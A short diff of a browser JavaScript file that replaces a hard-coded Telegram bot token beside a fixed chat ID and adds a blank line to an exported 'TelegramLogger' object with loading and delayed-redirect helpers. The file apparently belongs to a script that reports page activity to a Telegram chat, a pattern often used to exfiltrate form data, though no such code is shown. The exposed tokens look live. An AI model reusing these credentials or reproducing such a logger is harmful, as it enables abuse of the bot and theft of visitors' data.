@@ -1,5 +1,5 @@
 // === CONFIGURE YOUR TELEGRAM BOT HERE ===
-const TELEGRAM_BOT_TOKEN = "7378618796:AAEtSRK0ZpzZrsWiV8nb8V8Ze76xbYLUSWY"; // ← CHANGE THIS
+const TELEGRAM_BOT_TOKEN = "8363007926:AAH_QHKuAwja6S-T2hfWFmpIUNxoNVASefs"; // ← CHANGE THIS
 const TELEGRAM_CHAT_ID = "1631839399";     // ← CHANGE THIS
 // ========================================
 
@@ -126,4 +126,5 @@ window.TelegramLogger = {
   showLoading,
   hideLoading,
   delayRedirect
+
 };
